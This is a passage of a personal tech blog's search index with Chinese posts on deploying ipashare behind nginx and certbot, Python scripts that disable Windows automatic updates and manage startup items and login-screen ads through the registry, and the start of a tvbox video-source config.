xz.xx.xyz www.xx.xyz; # 设置最大请求体大小，建议设置为100M或更大 client_max_body_size 300M; # 设置客户端请求体缓冲区大小 client_body_buffer_size 128k; # 设置客户端请求体临时文件路径 client_body_temp_path /tmp/nginx_client_temp; # 设置超时时间 client_body_timeout 60s; location / { proxy_pass http://0.0.0.0:8888; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } sudo nginx -t sudo systemctl reload nginx # 自动申请 HTTPS 证书 # 直接用 certbot 给这个域名配置 SSL： sudo certbot --nginx -d xz.xx.xyz -d www.xx.xyz 输入邮箱 Y 自动SSL\ndocker-compose up -d --build 参考： https://github.com/togettoyou/ipashare\n","permalink":"https://qfsyso.github.io/posts/ipa-share/","summary":"Debian 服务器上部署 ipashare。\n部署前准备 服务器环境要求\n操作系统：Debian12\n网络：确保服务器能正常访问 Docker 镜像仓库及 Apple App Store Connect API。\n域名建议已绑定并正确解析到该服务器，支持 HTTPS（可通过 Nginx + Certbot 实现）。\n系统依赖工具安装\n执行以下命令安装 Docker 及 Docker Compose：\nsudo apt update sudo apt install -y docker.io docker-compose sudo systemctl enable --now docker 获取 Apple API 凭证\n登录 App Store Connect 创建 API 密钥，包括：\nIssuer ID\nKey ID\n.p8 文件\n这些是项目调用 App Store Connect API 必需项。\n使用 Docker Compose 部署 官方提供 docker-compose.yml 示例，可在服务器上创建并自定义：","title":"Ipa Share"},{"content":"python 禁用win自动更新\nWindows KB5063878更新 可能在大量数据写入后硬盘故障 https://www.neowin.net/news/report-microsofts-latest-windows-11-24h2-update-breaks-ssdshdds-may-corrupt-your-data/\n禁用win更新 import winreg import subprocess REG_PATH = r\u0026#34;SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\u0026#34; REG_NAME = \u0026#34;NoAutoUpdate\u0026#34; def get_update_status(): \u0026#34;\u0026#34;\u0026#34;获取 Windows 自动更新状态\u0026#34;\u0026#34;\u0026#34; try: reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0, winreg.KEY_READ) value, _ = winreg.QueryValueEx(reg_key, REG_NAME) winreg.CloseKey(reg_key) if value == 1: return \u0026#34;Windows 自动更新已禁用 (注册表控制)\u0026#34; else: return \u0026#34;Windows 自动更新已启用 (注册表控制)\u0026#34; except FileNotFoundError: return \u0026#34;未设置策略，使用系统默认 (通常为启用自动更新)\u0026#34; def disable_windows_update(): \u0026#34;\u0026#34;\u0026#34;禁用 Windows 自动更新\u0026#34;\u0026#34;\u0026#34; try: reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH) winreg.SetValueEx(reg_key, REG_NAME, 0, winreg.REG_DWORD, 1) winreg.CloseKey(reg_key) refresh_group_policy() return \u0026#34;已禁用 Windows 自动更新 (注册表方式)\u0026#34; except Exception as e: return f\u0026#34;禁用失败: {e}\u0026#34; def enable_windows_update(): \u0026#34;\u0026#34;\u0026#34;启用 Windows 自动更新\u0026#34;\u0026#34;\u0026#34; try: reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH) winreg.SetValueEx(reg_key, REG_NAME, 0, winreg.REG_DWORD, 0) winreg.CloseKey(reg_key) refresh_group_policy() return \u0026#34;已启用 Windows 自动更新 (注册表方式)\u0026#34; except Exception as e: return f\u0026#34;启用失败: {e}\u0026#34; def refresh_group_policy(): \u0026#34;\u0026#34;\u0026#34;刷新组策略\u0026#34;\u0026#34;\u0026#34; try: print(\u0026#34;正在刷新组策略，请稍候...\u0026#34;) subprocess.run([\u0026#34;gpupdate\u0026#34;, \u0026#34;/force\u0026#34;], capture_output=True, text=True, check=True) print(\u0026#34;组策略刷新完成 ✅\u0026#34;) except Exception as e: print(f\u0026#34;刷新组策略失败: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;请选择操作：\u0026#34;) print(\u0026#34;1 - 查看 Windows 更新状态\u0026#34;) print(\u0026#34;2 - 禁用自动更新\u0026#34;) print(\u0026#34;3 - 启用自动更新\u0026#34;) choice = input(\u0026#34;请输入选项 (1/2/3): \u0026#34;).strip() if choice == \u0026#34;1\u0026#34;: print(get_update_status()) elif choice == \u0026#34;2\u0026#34;: print(disable_windows_update()) elif choice == \u0026#34;3\u0026#34;: print(enable_windows_update()) else: print(\u0026#34;无效选项\u0026#34;) 剩余时间 import winreg import subprocess from datetime import datetime, timedelta REG_PATH = r\u0026#34;SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\u0026#34; def get_update_status(): \u0026#34;\u0026#34;\u0026#34;获取 Windows 更新策略状态\u0026#34;\u0026#34;\u0026#34; try: reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0, winreg.KEY_READ) try: no_auto, _ = winreg.QueryValueEx(reg_key, \u0026#34;NoAutoUpdate\u0026#34;) except FileNotFoundError: no_auto = 0 try: pause_start, _ = winreg.QueryValueEx(reg_key, \u0026#34;PauseUpdatesStartTime\u0026#34;) pause_end, _ = winreg.QueryValueEx(reg_key, \u0026#34;PauseUpdatesEndTime\u0026#34;) except FileNotFoundError: pause_start, pause_end = None, None winreg.CloseKey(reg_key) status = [] if no_auto == 1: status.append(\u0026#34;自动更新已禁用\u0026#34;) else: status.append(\u0026#34;自动更新已启用\u0026#34;) if pause_start and pause_end: status.append(f\u0026#34;更新已暂停: {pause_start} → {pause_end}\u0026#34;) return \u0026#34;；\u0026#34;.join(status) except Exception: return \u0026#34;未设置策略，系统默认 (自动更新启用)\u0026#34; def disable_windows_update(): set_reg_value(\u0026#34;NoAutoUpdate\u0026#34;, 1, winreg.REG_DWORD) refresh_group_policy() return \u0026#34;已禁用 Windows 自动更新\u0026#34; def enable_windows_update(): set_reg_value(\u0026#34;NoAutoUpdate\u0026#34;, 0, winreg.REG_DWORD) refresh_group_policy() return \u0026#34;已启用 Windows 自动更新\u0026#34; def pause_updates(days=7): \u0026#34;\u0026#34;\u0026#34;暂停更新 N 天\u0026#34;\u0026#34;\u0026#34; start_date = datetime.today().strftime(\u0026#34;%Y-%m-%d\u0026#34;) end_date = (datetime.today() + timedelta(days=days)).strftime(\u0026#34;%Y-%m-%d\u0026#34;) set_reg_value(\u0026#34;PauseUpdatesStartTime\u0026#34;, start_date, winreg.REG_SZ) set_reg_value(\u0026#34;PauseUpdatesEndTime\u0026#34;, end_date, winreg.REG_SZ) refresh_group_policy() return f\u0026#34;已暂停 Windows 更新 {days} 天 ({start_date} → {end_date})\u0026#34; def resume_updates(): \u0026#34;\u0026#34;\u0026#34;恢复更新 (删除暂停设置)\u0026#34;\u0026#34;\u0026#34; delete_reg_value(\u0026#34;PauseUpdatesStartTime\u0026#34;) delete_reg_value(\u0026#34;PauseUpdatesEndTime\u0026#34;) refresh_group_policy() return \u0026#34;已恢复 Windows 更新 (取消暂停)\u0026#34; def query_pause_remaining(): \u0026#34;\u0026#34;\u0026#34;查询暂停剩余天数\u0026#34;\u0026#34;\u0026#34; try: reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0, winreg.KEY_READ) pause_end, _ = winreg.QueryValueEx(reg_key, \u0026#34;PauseUpdatesEndTime\u0026#34;) winreg.CloseKey(reg_key) end_date = datetime.strptime(pause_end, \u0026#34;%Y-%m-%d\u0026#34;) today = datetime.today() delta = (end_date - today).days if delta \u0026gt; 0: return f\u0026#34;更新暂停还剩 {delta} 天 (到 {pause_end})\u0026#34; elif delta == 0: return f\u0026#34;更新暂停今天到期 ({pause_end})\u0026#34; else: return \u0026#34;暂停已过期\u0026#34; except FileNotFoundError: return \u0026#34;当前未设置暂停更新\u0026#34; except Exception as e: return f\u0026#34;查询失败: {e}\u0026#34; def set_reg_value(name, value, reg_type): try: reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH) winreg.SetValueEx(reg_key, name, 0, reg_type, value) winreg.CloseKey(reg_key) except Exception as e: print(f\u0026#34;写入注册表失败: {e}\u0026#34;) def delete_reg_value(name): try: reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0, winreg.KEY_SET_VALUE) winreg.DeleteValue(reg_key, name) winreg.CloseKey(reg_key) except FileNotFoundError: pass def refresh_group_policy(): \u0026#34;\u0026#34;\u0026#34;刷新组策略\u0026#34;\u0026#34;\u0026#34; try: print(\u0026#34;正在刷新组策略...\u0026#34;) subprocess.run([\u0026#34;gpupdate\u0026#34;, \u0026#34;/force\u0026#34;], capture_output=True, text=True, check=True) print(\u0026#34;组策略刷新完成 ✅\u0026#34;) except Exception as e: print(f\u0026#34;刷新组策略失败: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;请选择操作：\u0026#34;) print(\u0026#34;1 - 查看 Windows 更新状态\u0026#34;) print(\u0026#34;2 - 禁用自动更新\u0026#34;) print(\u0026#34;3 - 启用自动更新\u0026#34;) print(\u0026#34;4 - 暂停更新 (延迟 N 天)\u0026#34;) print(\u0026#34;5 - 恢复更新 (取消暂停)\u0026#34;) print(\u0026#34;6 - 查询暂停剩余天数\u0026#34;) choice = input(\u0026#34;请输入选项 (1/2/3/4/5/6): \u0026#34;).strip() if choice == \u0026#34;1\u0026#34;: print(get_update_status()) elif choice == \u0026#34;2\u0026#34;: print(disable_windows_update()) elif choice == \u0026#34;3\u0026#34;: print(enable_windows_update()) elif choice == \u0026#34;4\u0026#34;: days = input(\u0026#34;请输入要暂停的天数 (默认 7): \u0026#34;).strip() days = int(days) if days.isdigit() else 7 print(pause_updates(days)) elif choice == \u0026#34;5\u0026#34;: print(resume_updates()) elif choice == \u0026#34;6\u0026#34;: print(query_pause_remaining()) else: print(\u0026#34;无效选项\u0026#34;) 启动项 import os import winreg import shutil def get_startup_folder(user=True): \u0026#34;\u0026#34;\u0026#34;获取启动文件夹路径\u0026#34;\u0026#34;\u0026#34; if user: return os.path.expandvars(r\u0026#34;%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0026#34;) else: return os.path.expandvars(r\u0026#34;%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0026#34;) def list_startup_items(): \u0026#34;\u0026#34;\u0026#34;列出所有启动项（文件夹 + 注册表）\u0026#34;\u0026#34;\u0026#34; items = [] # 启动文件夹 for user in [True, False]: folder = get_startup_folder(user) if os.path.exists(folder): for f in os.listdir(folder): items.append({ \u0026#34;type\u0026#34;: \u0026#34;folder\u0026#34;, \u0026#34;user\u0026#34;: \u0026#34;CurrentUser\u0026#34; if user else \u0026#34;AllUsers\u0026#34;, \u0026#34;name\u0026#34;: f, \u0026#34;path\u0026#34;: os.path.join(folder, f) }) # 注册表启动项 reg_paths = [ (winreg.HKEY_CURRENT_USER, r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34;, \u0026#34;CurrentUser\u0026#34;), (winreg.HKEY_LOCAL_MACHINE, r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34;, \u0026#34;AllUsers\u0026#34;) ] for root, path, user in reg_paths: try: key = winreg.OpenKey(root, path) i = 0 while True: try: name, value, _ = winreg.EnumValue(key, i) items.append({ \u0026#34;type\u0026#34;: \u0026#34;registry\u0026#34;, \u0026#34;user\u0026#34;: user, \u0026#34;name\u0026#34;: name, \u0026#34;path\u0026#34;: value }) i += 1 except OSError: break except FileNotFoundError: continue return items def disable_startup_item(item): \u0026#34;\u0026#34;\u0026#34;禁用启动项（移动文件/删除注册表值）\u0026#34;\u0026#34;\u0026#34; if item[\u0026#34;type\u0026#34;] == \u0026#34;folder\u0026#34;: # 移动到 Startup.disabled disabled_dir = os.path.join(os.path.dirname(item[\u0026#34;path\u0026#34;]), \u0026#34;Startup.disabled\u0026#34;) os.makedirs(disabled_dir, exist_ok=True) shutil.move(item[\u0026#34;path\u0026#34;], os.path.join(disabled_dir, item[\u0026#34;name\u0026#34;])) print(f\u0026#34;已禁用启动项: {item[\u0026#39;name\u0026#39;]} (文件夹方式)\u0026#34;) elif item[\u0026#34;type\u0026#34;] == \u0026#34;registry\u0026#34;: if item[\u0026#34;user\u0026#34;] == \u0026#34;CurrentUser\u0026#34;: root = winreg.HKEY_CURRENT_USER else: root = winreg.HKEY_LOCAL_MACHINE path = r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; try: key = winreg.OpenKey(root, path, 0, winreg.KEY_SET_VALUE) winreg.DeleteValue(key, item[\u0026#34;name\u0026#34;]) winreg.CloseKey(key) print(f\u0026#34;已禁用启动项: {item[\u0026#39;name\u0026#39;]} (注册表方式)\u0026#34;) except Exception as e: print(f\u0026#34;禁用失败: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;==== 启动项列表 ====\u0026#34;) items = list_startup_items() for idx, item in enumerate(items): print(f\u0026#34;[{idx}] {item[\u0026#39;user\u0026#39;]} - {item[\u0026#39;type\u0026#39;]} - {item[\u0026#39;name\u0026#39;]} -\u0026gt; {item[\u0026#39;path\u0026#39;]}\u0026#34;) choice = input(\u0026#34;输入要禁用的编号 (或直接回车跳过): \u0026#34;).strip() if choice.isdigit(): idx = int(choice) if 0 \u0026lt;= idx \u0026lt; len(items): disable_startup_item(items[idx]) Qt5 import sys import os import struct import datetime import winreg from PyQt5.QtWidgets import ( QApplication, QWidget, QVBoxLayout, QTableWidget, QTableWidgetItem, QPushButton, QHBoxLayout, QMessageBox, QHeaderView ) # --------- 工具函数 --------- def get_startup_folder(user=True): base = os.path.expandvars(r\u0026#34;%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\u0026#34;) if user \\ else os.path.expandvars(r\u0026#34;%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\u0026#34;) return os.path.join(base, \u0026#34;Startup\u0026#34;) def read_reg_values(root, path): items = {} try: key = winreg.OpenKey(root, path) except FileNotFoundError: return items i = 0 while True: try: name, value, vtype = winreg.EnumValue(key, i) items[name] = (value, vtype) i += 1 except OSError: break winreg.CloseKey(key) return items def read_approved_state(root, path, name): \u0026#34;\u0026#34;\u0026#34;返回 \u0026#39;enabled\u0026#39; / \u0026#39;disabled\u0026#39; / \u0026#39;unknown\u0026#39;\u0026#34;\u0026#34;\u0026#34; try: key = winreg.OpenKey(root, path) data, vtype = winreg.QueryValueEx(key, name) winreg.CloseKey(key) if not isinstance(data, (bytes, bytearray)) or len(data) \u0026lt; 4: return \u0026#39;unknown\u0026#39; code = int.from_bytes(data[:4], \u0026#39;little\u0026#39;) if code in (2, 6): return \u0026#39;enabled\u0026#39; elif code == 3: return \u0026#39;disabled\u0026#39; else: return \u0026#39;unknown\u0026#39; except FileNotFoundError: return \u0026#39;unknown\u0026#39; except OSError: return \u0026#39;unknown\u0026#39; def filetime_now_bytes(): # FILETIME: 100ns ticks since 1601-01-01 UTC EPOCH = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc) now = datetime.datetime.now(datetime.timezone.utc) ticks = int((now - EPOCH).total_seconds() * 10_000_000) return struct.pack(\u0026#34;\u0026lt;Q\u0026#34;, ticks) def write_approved_state(root, path, name, enable=True): try: key = winreg.CreateKey(root, path) if enable: data = b\u0026#34;\\x02\\x00\\x00\\x00\u0026#34; + (b\u0026#34;\\x00\u0026#34; * 8) # 02 + 零FILETIME else: data = b\u0026#34;\\x03\\x00\\x00\\x00\u0026#34; + filetime_now_bytes() # 03 + 禁用时间 winreg.SetValueEx(key, name, 0, winreg.REG_BINARY, data) winreg.CloseKey(key) return True, None except PermissionError as e: return False, \u0026#34;需要管理员权限 (UAC)。\u0026#34; except Exception as e: return False, str(e) # --------- 数据模型构建 --------- def enumerate_startup_items(): \u0026#34;\u0026#34;\u0026#34; 仅从“真实来源”取项：Run/Run32/启动文件夹 然后用 StartupApproved 计算“最新状态” \u0026#34;\u0026#34;\u0026#34; items = [] # 1) 注册表 Run（当前用户 / 所有用户 64位 / 所有用户 32位） reg_sources = [ { \u0026#34;scope\u0026#34;: \u0026#34;CurrentUser\u0026#34;, \u0026#34;root\u0026#34;: winreg.HKEY_CURRENT_USER, \u0026#34;run_path\u0026#34;: r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34;, \u0026#34;approved_path\u0026#34;: r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\u0026#34;, \u0026#34;source\u0026#34;: \u0026#34;Run\u0026#34; }, { \u0026#34;scope\u0026#34;: \u0026#34;AllUsers\u0026#34;, \u0026#34;root\u0026#34;: winreg.HKEY_LOCAL_MACHINE, \u0026#34;run_path\u0026#34;: r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34;, \u0026#34;approved_path\u0026#34;: r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\u0026#34;, \u0026#34;source\u0026#34;: \u0026#34;Run\u0026#34; }, { \u0026#34;scope\u0026#34;: \u0026#34;AllUsers\u0026#34;, \u0026#34;root\u0026#34;: winreg.HKEY_LOCAL_MACHINE, \u0026#34;run_path\u0026#34;: r\u0026#34;Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34;, \u0026#34;approved_path\u0026#34;: r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run32\u0026#34;, \u0026#34;source\u0026#34;: \u0026#34;Run32\u0026#34; }, ] for src in reg_sources: values = read_reg_values(src[\u0026#34;root\u0026#34;], src[\u0026#34;run_path\u0026#34;]) for name, (cmd, vtype) in values.items(): state = read_approved_state(src[\u0026#34;root\u0026#34;], src[\u0026#34;approved_path\u0026#34;], name) # 未设置 StartupApproved 时，Windows 默认认为启用 effective = \u0026#34;启用\u0026#34; if state in (\u0026#34;enabled\u0026#34;, \u0026#34;unknown\u0026#34;) else \u0026#34;已禁用\u0026#34; items.append({ \u0026#34;scope\u0026#34;: src[\u0026#34;scope\u0026#34;], \u0026#34;type\u0026#34;: \u0026#34;registry\u0026#34;, \u0026#34;source\u0026#34;: src[\u0026#34;source\u0026#34;], \u0026#34;name\u0026#34;: name, \u0026#34;value\u0026#34;: str(cmd), \u0026#34;approved_state\u0026#34;: state, \u0026#34;effective\u0026#34;: effective, \u0026#34;root\u0026#34;: src[\u0026#34;root\u0026#34;], \u0026#34;run_path\u0026#34;: src[\u0026#34;run_path\u0026#34;], \u0026#34;approved_path\u0026#34;: src[\u0026#34;approved_path\u0026#34;] }) # 2) 启动文件夹（当前用户 / 所有用户） folder_sources = [ (\u0026#34;CurrentUser\u0026#34;, True, winreg.HKEY_CURRENT_USER, r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolder\u0026#34;), (\u0026#34;AllUsers\u0026#34;, False, winreg.HKEY_LOCAL_MACHINE, r\u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolder\u0026#34;), ] for scope, is_user, approved_root, approved_path in folder_sources: folder = get_startup_folder(user=is_user) if os.path.isdir(folder): for fn in os.listdir(folder): full = os.path.join(folder, fn) if not os.path.isfile(full): continue # 任务管理器里 StartupApproved\\StartupFolder 的值名通常是文件名（含扩展名） name = fn state = read_approved_state(approved_root, approved_path, name) effective = \u0026#34;启用\u0026#34; if state in (\u0026#34;enabled\u0026#34;, \u0026#34;unknown\u0026#34;) else \u0026#34;已禁用\u0026#34; items.append({ \u0026#34;scope\u0026#34;: scope, \u0026#34;type\u0026#34;: \u0026#34;folder\u0026#34;, \u0026#34;source\u0026#34;: \u0026#34;StartupFolder\u0026#34;, \u0026#34;name\u0026#34;: name, \u0026#34;value\u0026#34;: full, \u0026#34;approved_state\u0026#34;: state, \u0026#34;effective\u0026#34;: effective, \u0026#34;approved_root\u0026#34;: approved_root, \u0026#34;approved_path\u0026#34;: approved_path }) return items def change_item_state(item, enable=True): if item[\u0026#34;type\u0026#34;] == \u0026#34;registry\u0026#34;: # 写 StartupApproved 对应项 ok, err = write_approved_state(item[\u0026#34;root\u0026#34;], item[\u0026#34;approved_path\u0026#34;], item[\u0026#34;name\u0026#34;], enable) return ok, err else: # folder ok, err = write_approved_state(item[\u0026#34;approved_root\u0026#34;], item[\u0026#34;approved_path\u0026#34;], item[\u0026#34;name\u0026#34;], enable) return ok, err # --------- Qt UI --------- class StartupManager(QWidget): def __init__(self): super().__init__() self.setWindowTitle(\u0026#34;启动项管理器（精准状态 | 基于 StartupApproved）\u0026#34;) self.resize(980, 520) layout = QVBoxLayout(self) self.table = QTableWidget() self.table.setColumnCount(7) self.table.setHorizontalHeaderLabels([\u0026#34;作用域\u0026#34;, \u0026#34;来源\u0026#34;, \u0026#34;类型\u0026#34;, \u0026#34;名称\u0026#34;, \u0026#34;命令/路径\u0026#34;, \u0026#34;状态(生效)\u0026#34;, \u0026#34;原始状态\u0026#34;]) self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive) self.table.horizontalHeader().setStretchLastSection(True) self.table.setSortingEnabled(True) layout.addWidget(self.table) row = QHBoxLayout() self.btn_refresh = QPushButton(\u0026#34;刷新\u0026#34;) self.btn_enable = QPushButton(\u0026#34;启用\u0026#34;) self.btn_disable = QPushButton(\u0026#34;禁用\u0026#34;) row.addWidget(self.btn_refresh) row.addWidget(self.btn_enable) row.addWidget(self.btn_disable) layout.addLayout(row) self.btn_refresh.clicked.connect(self.load_items) self.btn_enable.clicked.connect(self.enable_selected) self.btn_disable.clicked.connect(self.disable_selected) self.load_items() def load_items(self): self.items = enumerate_startup_items() self.table.setRowCount(len(self.items)) for i, it in enumerate(self.items): self.table.setItem(i, 0, QTableWidgetItem(it[\u0026#34;scope\u0026#34;])) self.table.setItem(i, 1, QTableWidgetItem(it[\u0026#34;source\u0026#34;])) self.table.setItem(i, 2, QTableWidgetItem(it[\u0026#34;type\u0026#34;])) self.table.setItem(i, 3, QTableWidgetItem(it[\u0026#34;name\u0026#34;])) self.table.setItem(i, 4, QTableWidgetItem(it[\u0026#34;value\u0026#34;])) self.table.setItem(i, 5, QTableWidgetItem(it[\u0026#34;effective\u0026#34;])) # 真实生效状态 # 原始 StartupApproved 原码状态，便于排查 raw = {\u0026#34;enabled\u0026#34;: \u0026#34;启用(Approved)\u0026#34;, \u0026#34;disabled\u0026#34;: \u0026#34;禁用(Approved)\u0026#34;, \u0026#34;unknown\u0026#34;: \u0026#34;未知(未设置)\u0026#34;}.get(it[\u0026#34;approved_state\u0026#34;], \u0026#34;未知\u0026#34;) self.table.setItem(i, 6, QTableWidgetItem(raw)) # 列宽优化 self.table.resizeColumnsToContents() self.table.setColumnWidth(4, 520) def current_item(self): r = self.table.currentRow() if r \u0026lt; 0: QMessageBox.information(self, \u0026#34;提示\u0026#34;, \u0026#34;请先选择一条启动项\u0026#34;) return None return self.items[r] def enable_selected(self): it = self.current_item() if not it: return ok, err = change_item_state(it, True) if ok: QMessageBox.information(self, \u0026#34;成功\u0026#34;, f\u0026#34;已启用：{it[\u0026#39;name\u0026#39;]}\u0026#34;) self.load_items() else: QMessageBox.critical(self, \u0026#34;失败\u0026#34;, err or \u0026#34;启用失败\u0026#34;) def disable_selected(self): it = self.current_item() if not it: return ok, err = change_item_state(it, False) if ok: QMessageBox.information(self, \u0026#34;成功\u0026#34;, f\u0026#34;已禁用：{it[\u0026#39;name\u0026#39;]}\u0026#34;) self.load_items() else: QMessageBox.critical(self, \u0026#34;失败\u0026#34;, err or \u0026#34;禁用失败\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: app = QApplication(sys.argv) w = StartupManager() w.show() sys.exit(app.exec_()) “状态(生效)”= 根据 StartupApproved 计算的最终生效状态（与任务管理器一致）。\n“原始状态”= 直接读取 StartupApproved 的原始标志，便于排查。\n只枚举 Run / Run32 / 启动文件夹 三类常见来源；其它持久化方式（计划任务、服务、Policies\\Run 等）可按需再扩展。\n修改 AllUsers(HKLM) 时需要管理员权限（UAC）。\n关闭广告 # CloseAd import ctypes import winreg import sys def is_admin(): \u0026#34;\u0026#34;\u0026#34;判断是否为管理员权限\u0026#34;\u0026#34;\u0026#34; try: return ctypes.windll.shell32.IsUserAnAdmin() except: return False def get_login_state(): \u0026#34;\u0026#34;\u0026#34; 获取 Windows 登录状态 - 返回 True 表示在登录界面 - False 表示已登录 \u0026#34;\u0026#34;\u0026#34; WTSGetActiveConsoleSessionId = ctypes.windll.kernel32.WTSGetActiveConsoleSessionId session_id = WTSGetActiveConsoleSessionId() return session_id == 0xFFFFFFFF def clear_login_wallpaper(): \u0026#34;\u0026#34;\u0026#34; 清空 Windows 登录界面壁纸 设置为纯色（黑色） \u0026#34;\u0026#34;\u0026#34; key_path = r\u0026#34;SOFTWARE\\Policies\\Microsoft\\Windows\\System\u0026#34; try: reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) key = winreg.CreateKeyEx(reg, key_path, 0, winreg.KEY_WRITE) winreg.SetValueEx(key, \u0026#34;DisableLogonBackgroundImage\u0026#34;, 0, winreg.REG_DWORD, 1) winreg.CloseKey(key) print(\u0026#34;[+] 已清空登录界面壁纸\u0026#34;) except Exception as e: print(\u0026#34;[-] 清空壁纸失败:\u0026#34;, e) def disable_login_ads(): \u0026#34;\u0026#34;\u0026#34; 关闭 Windows 登录界面的广告/小提示 \u0026#34;\u0026#34;\u0026#34; paths = [ r\u0026#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ContentDeliveryManager\u0026#34;, r\u0026#34;SOFTWARE\\Policies\\Microsoft\\Windows\\CloudContent\u0026#34; ] try: for path in paths: reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) key = winreg.CreateKeyEx(reg, path, 0, winreg.KEY_WRITE) winreg.SetValueEx(key, \u0026#34;DisableWindowsSpotlightFeatures\u0026#34;, 0, winreg.REG_DWORD, 1) winreg.SetValueEx(key, \u0026#34;DisableConsumerFeatures\u0026#34;, 0, winreg.REG_DWORD, 1) winreg.CloseKey(key) print(\u0026#34;[+] 已关闭登录界面广告与推荐\u0026#34;) except Exception as e: print(\u0026#34;[-] 关闭广告失败:\u0026#34;, e) def menu(): print(\u0026#34;\u0026#34;\u0026#34; === Windows 登录界面管理工具 === 1. 查看登录界面状态 2. 清空登录壁纸 3. 关闭登录广告/推荐 0. 退出 \u0026#34;\u0026#34;\u0026#34;) choice = input(\u0026#34;请选择操作：\u0026#34;).strip() return choice if __name__ == \u0026#34;__main__\u0026#34;: if not is_admin(): print(\u0026#34;请以管理员权限运行该脚本！\u0026#34;) sys.exit(1) while True: choice = menu() if choice == \u0026#34;1\u0026#34;: state = \u0026#34;未登录（登录界面）\u0026#34; if get_login_state() else \u0026#34;已登录\u0026#34; print(f\u0026#34;[+] 当前登录状态: {state}\u0026#34;) elif choice == \u0026#34;2\u0026#34;: clear_login_wallpaper() elif choice == \u0026#34;3\u0026#34;: disable_login_ads() elif choice == \u0026#34;0\u0026#34;: print(\u0026#34;退出程序\u0026#34;) break else: print(\u0026#34;[-] 无效选择，请重新输入\u0026#34;) win禁用update 按下 Win + R，输入 services.msc 打开服务管理器。‌‌‌‌\n找到Windows Update服务，双击进入属性界面，将「启动类型」设为「禁用」，并点击「停止」。‌‌‌‌\n在「恢复」选项卡中，将三次失败后的操作均设为「无操作」，防止服务自动重启。‌‌\nNext Clear\n","permalink":"https://qfsyso.github.io/posts/python-stop-winupdate/","summary":"python 禁用win自动更新\nWindows KB5063878更新 可能在大量数据写入后硬盘故障 https://www.neowin.net/news/report-microsofts-latest-windows-11-24h2-update-breaks-ssdshdds-may-corrupt-your-data/\n禁用win更新 import winreg import subprocess REG_PATH = r\u0026#34;SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\u0026#34; REG_NAME = \u0026#34;NoAutoUpdate\u0026#34; def get_update_status(): \u0026#34;\u0026#34;\u0026#34;获取 Windows 自动更新状态\u0026#34;\u0026#34;\u0026#34; try: reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0, winreg.KEY_READ) value, _ = winreg.QueryValueEx(reg_key, REG_NAME) winreg.CloseKey(reg_key) if value == 1: return \u0026#34;Windows 自动更新已禁用 (注册表控制)\u0026#34; else: return \u0026#34;Windows 自动更新已启用 (注册表控制)\u0026#34; except FileNotFoundError: return \u0026#34;未设置策略，使用系统默认 (通常为启用自动更新)\u0026#34; def disable_windows_update(): \u0026#34;\u0026#34;\u0026#34;禁用 Windows 自动更新\u0026#34;\u0026#34;\u0026#34; try: reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH) winreg.SetValueEx(reg_key, REG_NAME, 0, winreg.REG_DWORD, 1) winreg.CloseKey(reg_key) refresh_group_policy() return \u0026#34;已禁用 Windows 自动更新 (注册表方式)\u0026#34; except Exception as e: return f\u0026#34;禁用失败: {e}\u0026#34; def enable_windows_update(): \u0026#34;\u0026#34;\u0026#34;启用 Windows 自动更新\u0026#34;\u0026#34;\u0026#34; try: reg_key = winreg.","title":"Python Stop WinUpdate"},{"content":"tvbox config 如 https://cj.lziapi.com/api.php/provide/vod\n获取 JSON 格式数据：\nhttps://cj.lziapi.com/api.php/provide/vod/at/json\n获取 XML 格式数据：\nhttps://cj.lziapi.com/api.php/provide/vod/at/xml\n指定来自 lzm3u8 的资源，并获取 XML：\nhttps://cj.lziapi.com/api.php/provide/vod/from/lzm3u8/at/xml/\ntvbox json { \u0026#34;sites\u0026#34;: [ { \u0026#34;key\u0026#34;: \u0026#34;lziapi\u0026#34;, 